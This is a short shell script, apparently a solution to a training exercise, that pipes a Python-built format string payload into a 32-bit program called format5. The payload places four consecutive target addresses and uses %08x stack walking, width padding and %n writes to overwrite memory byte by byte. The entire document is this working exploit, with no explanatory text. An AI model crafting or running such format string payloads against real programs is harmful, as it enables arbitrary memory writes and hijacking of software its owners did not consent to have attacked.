#!/bin/sh

#gcc -o format5 -m32 format5.c
python -c "print '\x1c\xa0\x04\x08'+'%08x'*5+'%190u+%n+___\x1d\xa0\x04\x08'+'%08x'*7+'%88u+%n+\x1e\xa0\x04\x08'+'%08x'*8+'%58u+%n+\x1f\xa0\x04\x08'+'%08x'*9+'%182u+%n+'" |./format5
